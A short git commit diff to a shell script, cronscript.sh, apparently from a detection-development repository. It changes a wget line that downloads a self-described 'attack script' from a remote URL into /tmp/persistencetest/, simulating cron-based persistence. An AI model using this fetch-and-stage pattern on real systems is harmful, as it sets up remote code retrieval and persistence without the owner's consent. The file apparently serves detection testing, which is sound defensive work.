0b1ac41a9d2cf6671fcaff7b90bef281e1c58384
mikecybersec <67545678+mikecybersec@users.noreply.github.com>
2021-02-16 15:02:22 +0000

    Update cronscript.sh

--- cronscript.sh
+++ cronscript.sh
@@ -3,7 +3,7 @@
 mkdir /tmp/persistencetest/
 
 #Grab the attack script
-wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello1.sh" -O /tmp/persistencetest/attack2.sh
+wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello.sh" -O /tmp/persistencetest/attack2.sh
 
 #Wait for 5 seconds
 sleep 5
